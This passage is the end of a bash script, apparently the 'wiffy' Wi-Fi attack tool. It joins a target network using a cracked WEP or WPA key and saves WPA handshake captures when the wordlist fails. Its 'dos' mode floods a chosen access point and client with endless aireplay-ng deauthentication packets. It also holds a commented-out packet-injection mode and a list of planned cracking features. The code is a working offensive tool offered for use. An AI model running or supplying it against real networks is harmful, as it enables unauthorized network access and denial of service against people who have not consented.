            action "i[f/w]config" "ifconfig $interface down && iwconfig $interface essid $essid key $key && ifconfig $interface up" $verbose $diagnostics "true"
         elif [ "$encryption" == "WPA" ] ; then
            action "wpa_passphrase" "wpa_passphrase $essid '$key' > /tmp/wiffy.conf" $verbose $diagnostics "true"
            action "wpa_supplicant" "wpa_supplicant -B -i $interface -c /tmp/wiffy.conf -D wext" $verbose $diagnostics "true"
         fi
         sleep 5
         action "dhclient" "dhclient $interface" $verbose $diagnostics "true"
         if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then
            ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
            display info "IP: $ourIP" $diagnostics
            #gateway=$(route -n | grep $interface | awk '/^0.0.0.0/ {getline; print $2}')
            #display info "Gateway: $gateway" $diagnostics
         fi
      fi
   #----------------------------------------------------------------------------------------------#
   elif [ "$encryption" == "WPA" ] ; then
      display error "WiFi Key not in wordlist" $diagnostics 1>&2
      display action "Moving handshake: $(pwd)/wiffy-$essid.cap" $diagnostics 1>&2
      action "Moving capture" "mv -f /tmp/wiffy*.cap $(pwd)/wiffy-$essid.cap" $verbose $diagnostics "true"
   #----------------------------------------------------------------------------------------------#
   elif [ "$encryption" != "N/A" ] ; then
      display error "Something went wrong )=" $diagnostics 1>&2
   fi


#----------------------------------------------------------------------------------------------#
elif [ "$mode" == "dos" ] ; then
   display action "Attack (DOS): $essid" $diagnostics
   command="aireplay-ng --deauth 0 -e $essid -a $bssid"
   if [ "$client" != "clientless" ] ; then  command="$command -c $client" ; fi
   command="$command $monitorInterface"
   action "aireplay-ng (DeAuth)" "$command" $verbose $diagnostics "true" &

   #----------------------------------------------------------------------------------------------#
   display info "Attacking! ...press CTRL+C to stop" $diagnostics
   if [ "$diagnostics" == "true" ] ; then echo "-Ready!----------------------------------" >> $logFile ; fi
   for (( ; ; )) ; do
      sleep 5
   done
#elif [ "$mode" == "inject" ] ; then
#   display action "Attack (Inject): $essid" $diagnostics
#   if [ "$encryption" != "WEP" ] ; then display error "Only works on WEP networks" $diagnostics 1>&2 ; cleanup ; fi

   #action "aireplay-ng (Inject)" "airtun-ng -a $bssid $monitorInterface" $verbose $diagnostics "true" &
   #action "aireplay-ng (Inject)" "ifconfig at0 192.168.1.83 netmask 255.255.255.0 up" $verbose $diagnostics "true" &

   # airmon-ng start wlan0
   # /pentest/wireless/airpwn-1.4/airpwn -c conf/greet_html -d rt73 -i mon0 -v

   #----------------------------------------------------------------------------------------------#
#   display info "Attacking! ...press CTRL+C to stop" $diagnostics
#   if [ "$diagnostics" == "true" ] ; then echo "-Ready!----------------------------------" >> $logFile ; fi
#   for (( ; ; )) ; do
#      sleep 5
#   done
fi

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ] ; then echo "-Done!---------------------------------------------------------------------------------------" >> $logFile ; fi
cleanup clean


#---Ideas--------------------------------------------------------------------------------------#
# WEP - Chopchop/FagmentationAP Packet Broadcast
# WPA - aircrack/coWPAtty
# WPA - brute / hash
# WPA - calculate hash
# WPA - use pre hash / use pre capture
# WPA - use folder for wordlist
# update aircrack/coWPATTY
# decrty packets (offline & online (airtun-ng))
# display error "The encryption ($encryption) on $essid isn't support" $diagnostics 1>&2 ; cleanup
# Hidden SSID?
# Mode - Injection - GET WORKING

# WiFi Key is in hex